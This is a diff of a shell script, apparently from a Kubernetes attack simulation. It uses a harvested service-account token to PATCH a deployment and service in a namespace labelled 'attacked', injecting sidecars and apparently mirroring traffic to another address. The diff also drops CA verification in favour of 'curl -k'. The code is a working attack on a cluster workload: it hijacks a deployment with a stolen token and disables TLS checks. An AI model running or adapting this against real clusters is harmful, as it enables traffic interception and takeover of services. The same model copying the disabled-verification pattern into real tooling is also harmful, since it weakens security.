@@ -3,7 +3,6 @@
 MIRRORADDR="${MIRRORADDR:-prova.dmz.svc.cluster.local:8080}"
 ATTACKED_NS="${ATTACKED_NS:-"dmz"}"
 TOKEN_PATH="$DATA_PATH/KC1/token"
-CA_PATH="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
 TOKEN=$(cat ${TOKEN_PATH})
 APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
 IPAUTH=$(nslookup -type=A auth.$AUTH_NS | awk '/Address: /{print $2}')
@@ -57,16 +56,14 @@ jq -n \
 ]' > $TMP_FILE
 
 # Adding sidecars
-curl -X PATCH \
-  --cacert "${CA_PATH}" \
+curl -k -X PATCH \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json-patch+json" \
   --data @$TMP_FILE \
   "${APISERVER}/apis/apps/v1/namespaces/${ATTACKED_NS}/deployments/image-provider"
 
 # Modify service
-curl -H "Authorization: Bearer $TOKEN" \
-  --cacert ${CA_PATH} \
+curl -k -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json-patch+json" \
   -X PATCH \
   "${APISERVER}/api/v1/namespaces/${ATTACKED_NS}/services/image-provider" \
